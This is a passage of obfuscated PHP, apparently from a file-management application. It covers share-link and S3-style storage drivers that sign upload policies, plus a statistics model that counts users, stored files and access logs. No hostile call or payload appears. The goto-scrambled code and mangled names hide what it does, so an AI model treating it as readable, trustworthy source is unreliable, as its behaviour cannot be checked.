$aåÙå¾»ÈÎ->getPathInner($BÈ¸„÷†ß¯[$eÊÏ×ƒÛ‘Š[76]]); $d¢¸ò‡ÜÕ = $aåÙå¾»ÈÎ->hashSimple($BÈ¸„÷†ß¯[$eÊÏ×ƒÛ‘Š[76]]); goto d›áùÊÅ±Ë; C¡ä‰Ú‡ô£: if (count($c›äî›í¦ª[$báÇÀ’ó«]) > 1) { $BÈ¸„÷†ß¯[$eÊÏ×ƒÛ‘Š[595]] = !0; } goto aˆ’ô¿¯ßÃ; d›áùÊÅ±Ë: $báÇÀ’ó« = $aåÙå¾»ÈÎ->hashMd5($BÈ¸„÷†ß¯[$eÊÏ×ƒÛ‘Š[76]]); if (strlen($báÇÀ’ó«) > 10 && !isset($c›äî›í¦ª[$báÇÀ’ó«])) { $c›äî›í¦ª[$báÇÀ’ó«] = array(); } $BÈ¸„÷†ß¯[$eÊÏ×ƒÛ‘Š[171]] = $d¢¸ò‡ÜÕ; goto f–Š¤ÄÁ‹†; aˆ’ô¿¯ßÃ: } unset($BÈ¸„÷†ß¯); $bÆñò­­Û = array($eÊÏ×ƒÛ‘Š[170] => array($eÊÏ×ƒÛ‘Š[7], array_keys($c›äî›í¦ª))); goto AÈâãˆØÅ; AÈâãˆØÅ: $F—ØÒè¨¤æ = Model($eÊÏ×ƒÛ‘Š[598]); $cÀ¹Ø‰‡¥ğ = $F—ØÒè¨¤æ->where($bÆñò­­Û)->select(); $cÀ¹Ø‰‡¥ğ = $cÀ¹Ø‰‡¥ğ ? $cÀ¹Ø‰‡¥ğ : array(); goto BÒ•ÍëêÃ; BÒ•ÍëêÃ: foreach ($cÀ¹Ø‰‡¥ğ as $F“ŒĞç—Á±) { if (!isset($c›äî›í¦ª[$F“ŒĞç—Á±[$eÊÏ×ƒÛ‘Š[170]]])) { continue; } $F¯ÄšŸŒè¼ = $c›äî›í¦ª[$F“ŒĞç—Á±[$eÊÏ×ƒÛ‘Š[170]]]; foreach ($F¯ÄšŸŒè¼ as &$BÈ¸„÷†ß¯) { $BÈ¸„÷†ß¯[$eÊÏ×ƒÛ‘Š[462]] = $F“ŒĞç—Á±[$eÊÏ×ƒÛ‘Š[462]]; $BÈ¸„÷†ß¯[$eÊÏ×ƒÛ‘Š[595]] = !0; } unset($BÈ¸„÷†ß¯); } $FĞ¸ÁŠ”Ë = array(); foreach ($C†êÉè÷® as $a×Ø÷·†‰Œ) { if (isset($a×Ø÷·†‰Œ[$eÊÏ×ƒÛ‘Š[595]]) && $a×Ø÷·†‰Œ[$eÊÏ×ƒÛ‘Š[595]]) { continue; } $B¶ùÙÒÅ™ = $aåÙå¾»ÈÎ->getPathInner($a×Ø÷·†‰Œ[$eÊÏ×ƒÛ‘Š[76]]); $DùŠµ©Ô‡Ó = $F—ØÒè¨¤æ->addFileMake($B¶ùÙÒÅ™, $a×Ø÷·†‰Œ[$eÊÏ×ƒÛ‘Š[78]], $a×Ø÷·†‰Œ[$eÊÏ×ƒÛ‘Š[171]], $a×Ø÷·†‰Œ[$eÊÏ×ƒÛ‘Š[170]], $a×Ø÷·†‰Œ[$eÊÏ×ƒÛ‘Š[28]], $A—ÀË±Û¥); $FĞ¸ÁŠ”Ë[] = $DùŠµ©Ô‡Ó; } goto cÑğ¶É¢; FÒ–ÆäÉáŒ: } } define($_SERVER[Ö‘Øù][599], $_SERVER[Ö‘Øù][600]); goto d÷…ŠŠ±; BÅùâê¿: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($bšøçÁé£ø) { $this->pathParse = $bšøçÁé£ø; } protected function infoParse($CÜ½‘ëÙØ, $bÜ² ½Ğšò = false) { $f¤õ§¯£ò­ =& $_SERVER[Ö‘Øù]; return Action($f¤õ§¯£ò­[1104])->sharePathInfo($this->pathParse[$f¤õ§¯£ò­[76]], !0, $bÜ² ½Ğšò); } public function listPath($AšÒ¢Üğ²â, $Fè×ïòô‚ = false) { $e©öÚ¦õÅÔ =& $_SERVER[Ö‘Øù]; $A…Ö‚„º„ = IO::listPath($AšÒ¢Üğ²â, $Fè×ïòô‚); foreach ($A…Ö‚„º„ as $A³…—†±å => $F…èğ™¼Ï) { if (!in_array($A³…—†±å, array($e©öÚ¦õÅÔ[74], $e©öÚ¦õÅÔ[75]))) { continue; } foreach ($F…èğ™¼Ï as $dÚŞì¾Ô§¿ => $FÍ—Ù† ¶–) { $FÍ—Ù† ¶– = Action($e©öÚ¦õÅÔ[1257])->parsePathChildren($FÍ—Ù† ¶–, array($e©öÚ¦õÅÔ[416] => $AšÒ¢Üğ²â)); $A…Ö‚„º„[$A³…—†±å][$dÚŞì¾Ô§¿] = Action($e©öÚ¦õÅÔ[1104])->shareItemInfo($FÍ—Ù† ¶–); } } return $A…Ö‚„º„; } public function listAll($e‹¾ˆÜ¹°á) { $E†Î»ÎšÇÈ =& $_SERVER[Ö‘Øù]; $eÖ¾ß‚˜„Ï = IO::listAll($e‹¾ˆÜ¹°á); foreach ($eÖ¾ß‚˜„Ï as &$fµ˜’‚ŞöÛ) { $d«ä¢·ïÏ = IO::info($fµ˜’‚ŞöÛ[$E†Î»ÎšÇÈ[76]]); $d«ä¢·ïÏ = is_array($d«ä¢·ïÏ) ? $d«ä¢·ïÏ : array(); $fµ˜’‚ŞöÛ = array_merge($d«ä¢·ïÏ, $fµ˜’‚ŞöÛ); $fµ˜’‚ŞöÛ[$E†Î»ÎšÇÈ[85]] = Action($E†Î»ÎšÇÈ[1104])->shareItemInfo($fµ˜’‚ŞöÛ); } unset($fµ˜’‚ŞöÛ); return $eÖ¾ß‚˜„Ï; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($eó¯¢“½™‘) { parent::__construct($eó¯¢“½™‘); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($A–˜°‹ÒÅ“) { parent::__construct($A–˜°‹ÒÅ“); $this->signatureVersion($_SERVER[Ö‘Øù][212]); } public function uploadFormData($A“÷âÕ¤Ò, $d–‘ºİÕ = 3600) { goto A—Ÿğç¿’ë; d¯£ÎôÒš¹: $CŒ¯å›… = hash_hmac($C¾Øã¤¥[1268], $e»ôµ­¸Ö, $bÒ·†•ïÜä, !0); $c¯ùØŸ¡±É = hash_hmac($C¾Øã¤¥[1268], $AÄ«ˆÒÌ‘½, $CŒ¯å›…, !0); $eÊÜ­ŠƒĞ“ = hash_hmac($C¾Øã¤¥[1268], $dÚ°°—¢á«, $c¯ùØŸ¡±É); goto C–†ä¨§Û; fƒšª¥¦Å¾: $e÷…´Èåƒê = array($this->accessKey, $eÛÔ¡ËàŒ, $this->region, $e»ôµ­¸Ö, $AÄ«ˆÒÌ‘½); $D¿—¥¾†êæ = implode($C¾Øã¤¥[8], $e÷…´Èåƒê); $BôÎ¡Ø¤äº = array($C¾Øã¤¥[1225] => gmdate($C¾Øã¤¥[1224], strtotime($C¾Øã¤¥[1261])), $C¾Øã¤¥[1226] => array(array($C¾Øã¤¥[1228] => $this->bucket), array($C¾Øã¤¥[1227] => $CŠ‹ª»¹Êğ), array($C¾Øã¤¥[1229], $C¾Øã¤¥[1230], $C¾Øã¤¥[33]), array($C¾Øã¤¥[1229], $C¾Øã¤¥[1262], $C¾Øã¤¥[33]), array($C¾Øã¤¥[1229], $C¾Øã¤¥[1263], $C¾Øã¤¥[33]), array($C¾Øã¤¥[1231] => $c˜½ÚÃ„ø), array($C¾Øã¤¥[1264] => $D¿—¥¾†êæ), array($C¾Øã¤¥[1265] => $a˜óù‘È©È), array($C¾Øã¤¥[1266] => $cçãÀ…Å„Ë), array($C¾Øã¤¥[1267] => $fÅ„ªå¥é–))); goto aˆºê÷ù¸; aˆºê÷ù¸: $dÚ°°—¢á« = base64_encode(json_encode($BôÎ¡Ø¤äº)); $F¿øƒ‹Ò„ = hash_hmac($C¾Øã¤¥[1268], $eÛÔ¡ËàŒ, $C¾Øã¤¥[1269] . $this->secret, !0); $bÒ·†•ïÜä = hash_hmac($C¾Øã¤¥[1268], $this->region, $F¿øƒ‹Ò„, !0); goto d¯£ÎôÒš¹; A—Ÿğç¿’ë: $C¾Øã¤¥ =& $_SERVER[Ö‘Øù]; $CŠ‹ª»¹Êğ = $C¾Øã¤¥[192]; $a˜óù‘È©È = $C¾Øã¤¥[1258]; goto DÀ«—ğÈ; E›Şñƒ‹ó®: $AÄ«ˆÒÌ‘½ = $C¾Øã¤¥[1260]; $fÅ„ªå¥é– = $d–‘ºİÕ . $C¾Øã¤¥[33]; $c˜½ÚÃ„ø = $C¾Øã¤¥[1223]; goto fƒšª¥¦Å¾; C–†ä¨§Û: $c®ˆ´ÎÈ¹£ = array($C¾Øã¤¥[211] => $C¾Øã¤¥[33], $C¾Øã¤¥[1270] => $C¾Øã¤¥[33], $C¾Øã¤¥[1227] => $CŠ‹ª»¹Êğ, $C¾Øã¤¥[1231] => $c˜½ÚÃ„ø, $C¾Øã¤¥[1235] => $dÚ°°—¢á«, $C¾Øã¤¥[1271] => $D¿—¥¾†êæ, $C¾Øã¤¥[1272] => $a˜óù‘È©È, $C¾Øã¤¥[1273] => $cçãÀ…Å„Ë, $C¾Øã¤¥[1274] => $fÅ„ªå¥é–, $C¾Øã¤¥[1275] => $eÊÜ­ŠƒĞ“, $C¾Øã¤¥[175] => $this->getHost()); return $c®ˆ´ÎÈ¹£; goto e›ÑÜ‹±ì–; DÀ«—ğÈ: $e»ôµ­¸Ö = $C¾Øã¤¥[59]; $cçãÀ…Å„Ë = gmdate($C¾Øã¤¥[1259]); $eÛÔ¡ËàŒ = gmdate($C¾Øã¤¥[744]); goto E›Şñƒ‹ó®; e›ÑÜ‹±ì–: } } goto C¡íˆ«‚‡; CÛÃØ†‹ò: class AnalysisModel extends ModelBaseLight { public function init($EîË¬¼ˆïÖ) { $F³«ËÉÃŒ‚ =& $_SERVER[Ö‘Øù]; $C¹®Ê‹šò‚ = array($F³«ËÉÃŒ‚[589] => array($F³«ËÉÃŒ‚[29] => $F³«ËÉÃŒ‚[1656], $F³«ËÉÃŒ‚[271] => array($F³«ËÉÃŒ‚[222], $F³«ËÉÃŒ‚[758], $F³«ËÉÃŒ‚[1657], $F³«ËÉÃŒ‚[1658])), $F³«ËÉÃŒ‚[1659] => array($F³«ËÉÃŒ‚[29] => $F³«ËÉÃŒ‚[1660], $F³«ËÉÃŒ‚[271] => array($F³«ËÉÃŒ‚[222], $F³«ËÉÃŒ‚[756], $F³«ËÉÃŒ‚[1661], $F³«ËÉÃŒ‚[1662], $F³«ËÉÃŒ‚[1663]))); if (!isset($C¹®Ê‹šò‚[$EîË¬¼ˆïÖ])) { return !1; } $this->optionType = $C¹®Ê‹šò‚[$EîË¬¼ˆïÖ][$F³«ËÉÃŒ‚[29]]; $this->field = $C¹®Ê‹šò‚[$EîË¬¼ˆïÖ][$F³«ËÉÃŒ‚[271]]; return !0; } public function listData($DàÔ³©¾Ûì = false, $e¶»‹Ö«”Ú = "\x6d\x6f\x64\x69\146\x79\x54\x69\x6d\145", $D“ñ¼½Š®¼ = false) { return parent::listData($DàÔ³©¾Ûì, $e¶»‹Ö«”Ú, $D“ñ¼½Š®¼); } public function trendList($eˆ™ÒªÄÇ¢) { goto aÊÍâß„ñ; D¬½«é÷ßÎ: foreach ($fá¨§ˆ»ƒ as $FÛ¥±³Çµ±) { $this->{$dÜÑ¨ŸÒ}($FÛ¥±³Çµ±); } return $this->listData(); goto Aáæ†Ê‘›©; e—‰¹ÆÂ¬í: if (!isset($cçœèêÈª)) { $e–Ø’Ì™˜ô = $eˆ™ÒªÄÇ¢ == $CùíÃ”‰â°[589] ? $CùíÃ”‰â°[533] : $CùíÃ”‰â°[825]; $cçœèêÈª = Model($e–Ø’Ì™˜ô)->min($CùíÃ”‰â°[194]); } $dÜÑ¨ŸÒ = $CùíÃ”‰â°[1666] . ucfirst($eˆ™ÒªÄÇ¢); $fá¨§ˆ»ƒ = $this->dateList($cçœèêÈª); goto D¬½«é÷ßÎ; aÊÍâß„ñ: $CùíÃ”‰â° =& $_SERVER[Ö‘Øù]; $A—¹£½¿²› = $this->listData(); if ($A—¹£½¿²›) { $Dƒ¼Â–ÍÖ‡ = end($A—¹£½¿²›); $FÛ¥±³Çµ± = date($CùíÃ”‰â°[1664], strtotime($CùíÃ”‰â°[1665])); if ($Dƒ¼Â–ÍÖ‡[$CùíÃ”‰â°[222]] == $FÛ¥±³Çµ±) { return $A—¹£½¿²›; } $cçœèêÈª = strtotime($Dƒ¼Â–ÍÖ‡[$CùíÃ”‰â°[222]]); } goto e—‰¹ÆÂ¬í; Aáæ†Ê‘›©: } private function dateList($cáñà°æ–Å) { $aáĞ¬¢ãË© =& $_SERVER[Ö‘Øù]; $a¬¿ãÎèÒ = $cáñà°æ–Å; $E‚•ºƒË¬“ = strtotime($aáĞ¬¢ãË©[1665]); $e£„§¼ø– = array(); while ($a¬¿ãÎèÒ <= $E‚•ºƒË¬“) { $e£„§¼ø–[] = date($aáĞ¬¢ãË©[1664], $a¬¿ãÎèÒ); $a¬¿ãÎèÒ = strtotime($aáĞ¬¢ãË©[1667], $a¬¿ãÎèÒ); } return $e£„§¼ø–; } public function _recordUser($dí£‰¨ó = '') { goto B…Ù¦œ–ºæ; c›¨§º¹–: $A™ÀÏ˜Ù¾† = Model($F‘Ù‰´ö¤•[533])->where($Bé‰‚À“)->count($F‘Ù‰´ö¤•[1561]); $Bé‰‚À“[$F‘Ù‰´ö¤•[29]] = $F‘Ù‰´ö¤•[1670]; $A¼‹ˆ×²³– = Model($F‘Ù‰´ö¤•[1671])->where($Bé‰‚À“)->count($F‘Ù‰´ö¤•[1672]); goto bøŠŸ“Íë; B‹Î¹™·: $Bé‰‚À“ = array($F‘Ù‰´ö¤•[194] => array($F‘Ù‰´ö¤•[1006], $e°¿Œ…ªğš)); $b¸³ïÆÈ°ó = Model($F‘Ù‰´ö¤•[533])->where($Bé‰‚À“)->count($F‘Ù‰´ö¤•[1561]); $Bé‰‚À“[$F‘Ù‰´ö¤•[194]] = array($F‘Ù‰´ö¤•[331], array($fÓ®¶¼¥‰–, $e°¿Œ…ªğš)); goto c›¨§º¹–; bøŠŸ“Íë: $Eßî­¢‡” = array($F‘Ù‰´ö¤•[222] => $dí£‰¨ó, $F‘Ù‰´ö¤•[758] => (int) $b¸³ïÆÈ°ó, $F‘Ù‰´ö¤•[1657] => (int) $A™ÀÏ˜Ù¾†, $F‘Ù‰´ö¤•[1658] => (int) $A¼‹ˆ×²³–); return $this->insert($Eßî­¢‡”); goto F†ààëÏ‡Ş; B…Ù¦œ–ºæ: $F‘Ù‰´ö¤• =& $_SERVER[Ö‘Øù]; $fÓ®¶¼¥‰– = strtotime(date($F‘Ù‰´ö¤•[1668], strtotime($dí£‰¨ó))); $e°¿Œ…ªğš = strtotime(date($F‘Ù‰´ö¤•[1669], strtotime($dí£‰¨ó))); goto B‹Î¹™·; F†ààëÏ‡Ş: } public function _recordStore($DÓÉğ…ŠĞ = '') { goto a¢ÜÚ®ÚÎ; a¢ÜÚ®ÚÎ: $Cï Â¿šà =& $_SERVER[Ö‘Øù]; $AáÏÔ¯ß»– = strtotime(date($Cï Â¿šà[1669], strtotime($DÓÉğ…ŠĞ))); $cÇ©¸Ñî— = array($Cï Â¿šà[194] => array($Cï Â¿šà[1006], $AáÏÔ¯ß»–)); goto EÄôœĞŠ†»; CôõÄ×Ï‚: $B©É‰…Á = Model($Cï Â¿šà[825])->where($cÇ©¸Ñî—)->sum($Cï Â¿šà[78]); $f½®¹•åÓ¨ = array($Cï Â¿šà[222] => $DÓÉğ…ŠĞ, $Cï Â¿šà[756] => (int) $c„ÃÃîØ•·, $Cï Â¿šà[1661] => (int) $eİÉ´”×À´, $Cï Â¿šà[1662] => (int) $d‰›¢‰œƒ», $Cï Â¿šà[1663] => (int) $B©É‰…Á); return $this->insert($f½®¹•åÓ¨); goto fÚ¢ÃÃßÑÀ; EÄôœĞŠ†»: $eİÉ´”×À´ = Model($Cï Â¿šà[465])->where($cÇ©¸Ñî—)->sum($Cï Â¿šà[78]); $cÇ©¸Ñî—[$Cï Â¿šà[405]] = 0; $c„ÃÃîØ•· = Model($Cï Â¿šà[825])->where($cÇ©¸Ñî—)->sum($Cï Â¿šà[78]); goto A¹»×¹•òñ; A¹»×¹•òñ: $cÇ©¸Ñî—[$Cï Â¿šà[406]] = 1; $d‰›¢‰œƒ» = Model($Cï Â¿šà[825])->where($cÇ©¸Ñî—)->sum($Cï Â¿šà[78]); $cÇ©¸Ñî—[$Cï Â¿šà[406]] = 2; goto CôõÄ×Ï‚; fÚ¢ÃÃßÑÀ: } public function trend($FÀä–£¤­´, $fÁË•ÊöÉ) { goto AÖĞ›‹Ìê; AÖĞ›‹Ìê: $a¾ ‡ñÊÂó =& $_SERVER[Ö‘Øù]; if (!$this->init($FÀä–£¤­´)) { return !1; } $e®«®£«Ø¨ = $this->trendList($FÀä–£¤­´); goto DºÁÂ…ğ´Å; dœ¥óÓº˜: if (empty($e®«®£«Ø¨)) { $bÀÑ¤‰¢ë£ = date($a¾ ‡ñÊÂó[1664], strtotime($a¾ ‡ñÊÂó[1665])); $eÖÍ‹ö‰›¯ = array($a¾ ‡ñÊÂó[222] => $bÀÑ¤‰¢ë£); foreach ($D»ÙÔÜíÕÅ[$FÀä–£¤­´] as $b†ÀÌÊŸöö => $E²ÛÆø‘ë×) { $eÖÍ‹ö‰›¯[$b†ÀÌÊŸöö] = 0; } $e®«®£«Ø¨[] = $eÖÍ‹ö‰›¯; } $EõêëõÒ“ = array(); foreach ($e®«®£«Ø¨ as $E²ÛÆø‘ë×) { if ($FÀä–£¤­´ == $a¾ ‡ñÊÂó[1659] && $E²ÛÆø‘ë×[$a¾ ‡ñÊÂó[1661]] > $E²ÛÆø‘ë×[$a¾ ‡ñÊÂó[756]]) { $E²ÛÆø‘ë×[$a¾ ‡ñÊÂó[1661]] = $E²ÛÆø‘ë×[$a¾ ‡ñÊÂó[756]]; } foreach ($D»ÙÔÜíÕÅ[$FÀä–£¤­´] as $b†ÀÌÊŸöö => $e¾ø‰á©ğŒ) { $DõæŒ§°Õ = array($a¾ ‡ñÊÂó[222] => $E²ÛÆø‘ë×[$a¾ ‡ñÊÂó[222]], $a¾ ‡ñÊÂó[1464] => $e¾ø‰á©ğŒ); $DõæŒ§°Õ[$c‹Ü¨æŸê[$FÀä–£¤­´]] = isset($E²ÛÆø‘ë×[$b†ÀÌÊŸöö]) ? $E²ÛÆø‘ë×[$b†ÀÌÊŸöö] : 0; $EõêëõÒ“[] = $DõæŒ§°Õ; } } goto f˜ÇàÎ‰è’; f˜ÇàÎ‰è’: return $EõêëõÒ“; goto d˜‚ñØ¬²; DºÁÂ…ğ´Å: if ($e®«®£«Ø¨ && $fÁË•ÊöÉ != $a¾ ‡ñÊÂó[1534]) { $CÔŞ‡Ò­¯— = $e®«®£«Ø¨[0][$a¾ ‡ñÊÂó[222]]; $b®¾´Ï‰Ş = $this->validDate($fÁË•ÊöÉ, $CÔŞ‡Ò­¯—); $AÒà†İÌÂ = array(); $aËŒÂÂ›œ½ = array_to_keyvalue($e®«®£«Ø¨, $a¾ ‡ñÊÂó[222]); foreach ($b®¾´Ï‰Ş as $bÀÑ¤‰¢ë£) { if (isset($aËŒÂÂ›œ½[$bÀÑ¤‰¢ë£])) { $DõæŒ§°Õ = $aËŒÂÂ›œ½[$bÀÑ¤‰¢ë£]; } else { $DõæŒ§°Õ = end($e®«®£«Ø¨); $DõæŒ§°Õ[$a¾ ‡ñÊÂó[222]] = $bÀÑ¤‰¢ë£; if ($FÀä–£¤­´ == $a¾ ‡ñÊÂó[589]) { $DõæŒ§°Õ[$a¾ ‡ñÊÂó[1657]] = $DõæŒ§°Õ[$a¾ ‡ñÊÂó[1658]] = 0; } } $AÒà†İÌÂ[] = $DõæŒ§°Õ; } $e®«®£«Ø¨ = $AÒà†İÌÂ; } $D»ÙÔÜíÕÅ = array($a¾ ‡ñÊÂó[589] => array($a¾ ‡ñÊÂó[758] => LNG($a¾ ‡ñÊÂó[1673]), $a¾ ‡ñÊÂó[1657] => LNG($a¾ ‡ñÊÂó[1674]), $a¾ ‡ñÊÂó[1658] => LNG($a¾ ‡ñÊÂó[1675])), $a¾ ‡ñÊÂó[1659] => array($a¾ ‡ñÊÂó[756] => LNG($a¾ ‡ñÊÂó[1676]), $a¾ ‡ñÊÂó[1661] => LNG($a¾ ‡ñÊÂó[1677]), $a¾ ‡ñÊÂó[1662] => LNG($a¾ ‡ñÊÂó[1678]), $a¾ ‡ñÊÂó[1663] => LNG($a¾ ‡ñÊÂó[1679]))); $c‹Ü¨æŸê = array($a¾ ‡ñÊÂó[589] => $a¾ ‡ñÊÂó[1680], $a¾ ‡ñÊÂó[1659] => $a¾ ‡ñÊÂó[78]); goto dœ¥óÓº˜; d˜‚ñØ¬²: } public function validDate($f¬ÅÖ ¥É†, $e´¼£…¥ºÆ) { goto b¨­©”Äá§; b¡Î”¬‹¥ì: switch ($f¬ÅÖ ¥É†) { case $E×µÙöÚÌ[1541]: $f”¤ºøÏŠß = mktime(0, 0, 0, date($E×µÙöÚÌ[1681]), date($E×µÙöÚÌ[1287]) - date($E×µÙöÚÌ[1348]) + 7 - 7, date($E×µÙöÚÌ[1682])); $dÉ¹»öÀĞ = 0; do { $E­‘„’º—Œ = date($E×µÙöÚÌ[1664], $f”¤ºøÏŠß - 3600 * 24 * 7 * $dÉ¹»öÀĞ); $E¼¥¹ö×¤Ø[] = $E­‘„’º—Œ; $dÉ¹»öÀĞ++; } while ($e´¼£…¥ºÆ < $E­‘„’º—Œ); break; case $E×µÙöÚÌ[1539]: $dÉ¹»öÀĞ = 1; do { $A·—³×· = date($E×µÙöÚÌ[1683], strtotime("\x2d\40{$dÉ¹»öÀĞ}\x20\x6d\x6f\x6e\164\x68\163")); $E¼¥¹ö×¤Ø[] = $A·—³×·; $dÉ¹»öÀĞ++; } while ($e´¼£…¥ºÆ < $A·—³×·); break; case $E×µÙöÚÌ[1684]: $aÛ¡ª‡îÁğ = (int) date($E×µÙöÚÌ[1682], strtotime($e´¼£…¥ºÆ)); $AĞÅğÀ½Ó = (int) date($E×µÙöÚÌ[1682]); if ($aÛ¡ª‡îÁğ >= $AĞÅğÀ½Ó) { break; } for ($aÛ¡ª‡îÁğ; $aÛ¡ª‡îÁğ < $AĞÅğÀ½Ó; $aÛ¡ª‡îÁğ++) { $E¼¥¹ö×¤Ø[] = $aÛ¡ª‡îÁğ . $E×µÙöÚÌ[1685]; } break; default: break; } if ($e´¼£…¥ºÆ > end($E¼¥¹ö×¤Ø)) { array_pop($E¼¥¹ö×¤Ø); } sort($E¼¥¹ö×¤Ø); goto EÎíˆ¦³ÂÈ; EÎíˆ¦³ÂÈ: return $E¼¥¹ö×¤Ø; goto e¼Ò†î¤Œ·; b¨­©”Äá§: $E×µÙöÚÌ =& $_SERVER[Ö‘Øù]; $C×³àâí¦‘ = date($E×µÙöÚÌ[1664], strtotime($E×µÙöÚÌ[1665])); $E¼¥¹ö×¤Ø = array($C×³àâí¦‘); goto b¡Î”¬‹¥ì; e¼Ò†î¤Œ·: } public function listTable($BØÔ®‡’²) { $F³ò¥à¡÷æ = ucfirst($BØÔ®‡’²); return Model($F³ò¥à¡÷æ)->listData(); } public function option($c‡Ë¸†õ¦ˆ) { $CƒÚÓ¤Ä© = $_SERVER[Ö‘Øù][1686] . ucfirst($c‡Ë¸†õ¦ˆ); return $this->{$CƒÚÓ¤Ä©}(); } private function optionUser() { goto d˜Ü‰Ò‘; c‹¤’Îƒ: return array($fÃ™‚í©İ¦[752] => (int) $AÏâµò™µ, $fÃ™‚í©İ¦[1689] => (int) ($AÏâµò™µ - $dø¦Ä¢Ïí˜), $fÃ™‚í©İ¦[1690] => (int) $dø¦Ä¢Ïí˜, $fÃ™‚í©İ¦[1691] => (int) $a´ñì”îç, $fÃ™‚í©İ¦[1692] => $B²„©áİ·); goto FŠ§ù¶İ¯Â; e¬˜êÀ‡: if ($C¨‹ŒÅ»¢Ë < $Böˆ£ÍÛÒ¿) { $C¨‹ŒÅ»¢Ë = $Böˆ£ÍÛÒ¿; } $eÎÍ£ö¹èÍ = array($fÃ™‚í©İ¦[1688] => array($fÃ™‚í©İ¦[1007], $C¨‹ŒÅ»¢Ë)); $B²„©áİ· = (int) Model($fÃ™‚í©İ¦[533])->where($eÎÍ£ö¹èÍ)->count($fÃ™‚í©İ¦[1561]); goto eãµî ŠÛ¿; eãµî ŠÛ¿: if (!$B²„©áİ·) { $B²„©áİ· = 1; } $eÎÍ£ö¹èÍ = array($fÃ™‚í©İ¦[1688] => array($fÃ™‚í©İ¦[1007], $Böˆ£ÍÛÒ¿)); $a´ñì”îç = Model($fÃ™‚í©İ¦[533])->where($eÎÍ£ö¹èÍ)->count($fÃ™‚í©İ¦[1561]); goto c‹¤’Îƒ; dÜç‡ËãÆ: $EòÚ£¨àâˆ = intval($GLOBALS[$fÃ™‚í©İ¦[6]][$fÃ™‚í©İ¦[347]][$fÃ™‚í©İ¦[1520]]) / 3600; $C¨‹ŒÅ»¢Ë = strtotime("\x2d{$EòÚ£¨àâˆ}\40\x68\x6f\165\162\163"); $Böˆ£ÍÛÒ¿ = strtotime(date($fÃ™‚í©İ¦[1668])); goto e¬˜êÀ‡; d˜Ü‰Ò‘: $fÃ™‚í©İ¦ =& $_SERVER[Ö‘Øù]; $AÏâµò™µ = Model($fÃ™‚í©İ¦[533])->count($fÃ™‚í©İ¦[1561]); $dø¦Ä¢Ïí˜ = Model($fÃ™‚í©İ¦[533])->where($fÃ™‚í©İ¦[1687])->count($fÃ™‚í©İ¦[1561]); goto dÜç‡ËãÆ; FŠ§ù¶İ¯Â: } private function optionFile() { goto a´ê„«¹Œ¥; a´ê„«¹Œ¥: $FîÆ­ø¸µà =& $_SERVER[Ö‘Øù]; $cÖº¸ñ¼†Î = $this->sourceSize(); $b»³ÎÏ´„î = $cÖº¸ñ¼†Î[$FîÆ­ø¸µà[78]]; goto b®ìÀ›ìùÖ; aô‘¸òšÛÏ: $D‡Öìë™é‰ = Model($FîÆ­ø¸µà[825])->where($e¶êÚğ·¹)->sum($FîÆ­ø¸µà[78]); $Bë¤áÌ›±Å = Model($FîÆ­ø¸µà[825])->where($e¶êÚğ·¹)->count($FîÆ­ø¸µà[397]); return array($FîÆ­ø¸µà[756] => $b»³ÎÏ´„î, $FîÆ­ø¸µà[1661] => $eÄáˆÂŸãµ, $FîÆ­ø¸µà[1693] => $b»³ÎÏ´„î - $eÄáˆÂŸãµ, $FîÆ­ø¸µà[1694] => (int) $D‡Öìë™é‰, $FîÆ­ø¸µà[758] => (int) $d’¥öÔøé÷, $FîÆ­ø¸µà[1695] => (int) $Bë¤áÌ›±Å); goto B®±•Åù¾; b®ìÀ›ìùÖ: $eÄáˆÂŸãµ = $cÖº¸ñ¼†Î[$FîÆ­ø¸µà[1661]]; $d’¥öÔøé÷ = Model($FîÆ­ø¸µà[825])->where(array($FîÆ­ø¸µà[405] => 0))->count($FîÆ­ø¸µà[397]); $e¶êÚğ·¹ = array($FîÆ­ø¸µà[405] => 0, $FîÆ­ø¸µà[194] => array($FîÆ­ø¸µà[1007], strtotime(date($FîÆ­ø¸µà[1668])))); goto aô‘¸òšÛÏ; B®±•Åù¾: } private function optionAccess() { $cºÈ¹„†™‹ =& $_SERVER[Ö‘Øù]; return array($cºÈ¹„†™‹[752] => $this->typeLogCnt(), $cºÈ¹„†™‹[107] => $this->typeLogCnt($cºÈ¹„†™‹[107]), $cºÈ¹„†™‹[445] => $this->typeLogCnt($cºÈ¹„†™‹[445]), $cºÈ¹„†™‹[1696] => $this->typeLogCnt($cºÈ¹„†™‹[1696]), $cºÈ¹„†™‹[1697] => $this->typeLogCnt($cºÈ¹„†™‹[1697]), $cºÈ¹„†™‹[589] => $this->typeLogCnt($cºÈ¹„†™‹[33], $cºÈ¹„†™‹[1672])); } private function typeLogCnt($fßâ’‡Şè = '', $F›œÅ®Ğğ = "\151\x64") { goto fãË§½¥ôì; BÍÙï‡½: $bßëƒ øê¶ = array($bËÇ§¸Û[194] => array($bËÇ§¸Û[1007], $cÑ£ñ¯‰Ü§)); if ($fßâ’‡Şè) { $bßëƒ øê¶[$bËÇ§¸Û[29]] = array($bËÇ§¸Û[7], $D§‚ƒîÅ‚¿[$fßâ’‡Şè]); } $CÚÁ…­Ñà = Model($bËÇ§¸Û[1671])->where($bßëƒ øê¶)->count($F›œÅ®Ğğ); goto F¹·½“ˆÏ¤; fãË§½¥ôì: $bËÇ§¸Û =& $_SERVER[Ö‘Øù]; $D§‚ƒîÅ‚¿ = array($bËÇ§¸Û[107] => array($bËÇ§¸Û[1698], $bËÇ§¸Û[1699]), $bËÇ§¸Û[445] => array($bËÇ§¸Û[1700], $bËÇ§¸Û[1701]), $bËÇ§¸Û[1696] => array($bËÇ§¸Û[1702], $bËÇ§¸Û[1703], $bËÇ§¸Û[1704]), $bËÇ§¸Û[1697] => array($bËÇ§¸Û[1705], $bËÇ§¸Û[1706]), $bËÇ§¸Û[1707] => array($bËÇ§¸Û[1708], $bËÇ§¸Û[1709], $bËÇ§¸Û[1710])); $cÑ£ñ¯‰Ü§ = strtotime(date($bËÇ§¸Û[1668])); goto BÍÙï‡½; F¹·½“ˆÏ¤: return (int) $CÚÁ…­Ñà; goto cğ¸±ËŒ£²; cğ¸±ËŒ£²: } private function optionServer() { goto cå‰¿ÇêñÇ; c¯‰›ÂÒ×¿: $BÁ‹¤‘ŠÄ = $d¤ºñ‘¯‚[0]; $bòáÒÔÂ¼Ô = $GLOBALS[$d›ˆÎèÕóŠ[6]][$d›ˆÎèÕóŠ[17]]; $eÈ¹‘ªºÉ = $bòáÒÔÂ¼Ô[$d›ˆÎèÕóŠ[968]]; goto 